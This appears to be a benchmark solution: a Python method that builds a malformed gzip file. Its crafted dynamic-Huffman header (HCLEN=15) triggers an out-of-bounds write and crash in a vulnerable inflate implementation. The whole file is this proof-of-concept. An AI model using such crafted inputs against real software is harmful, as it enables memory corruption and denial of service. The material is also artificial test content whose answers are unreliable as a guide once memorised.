import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header (10 bytes)
        # Magic (1f 8b), Method (08), Flags (00), MTime (00000000), XFL (00), OS (03)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Deflate Payload (9 bytes)
        # This payload constructs a Dynamic Huffman block with HCLEN=15.
        # HCLEN=15 implies 19 code length codes will be read.
        # The vulnerable implementation uses a fixed-size array of 15 for these codes.
        # The order of code lengths is 16, 17, 18, 0, 8...
        # The first code processed (index 16) triggers an Out-Of-Bounds write on the array (indices 0-14).
        #
        # Bitstream construction:
        # Byte 0 (0x05): 
        #   Bits 0-2: 101 (BFINAL=1, BTYPE=2 Dynamic)
        #   Bits 3-7: 00000 (HLIT=0)
        # Byte 1 (0xE0):
        #   Bits 0-4: 00000 (HDIST=0)
        #   Bits 5-7: 111 (Lower 3 bits of HCLEN=15)
        # Byte 2 (0x01):
        #   Bit 0: 1 (Upper bit of HCLEN=15)
        #   Bits 1-3: 000 (Code Length for index 16) -> Writes to index 16 -> CRASH
        #   Bits 4-7: 0... (Remaining bits, padded)
        # Bytes 3-8: 0x00 (Padding to maintain stream validity/length)
        payload = b'\x05\xE0\x01\x00\x00\x00\x00\x00\x00'
        
        # GZIP Footer (8 bytes)
        # CRC32 (0) + ISIZE (0). Values irrelevant as crash occurs before check.
        footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        return header + payload + footer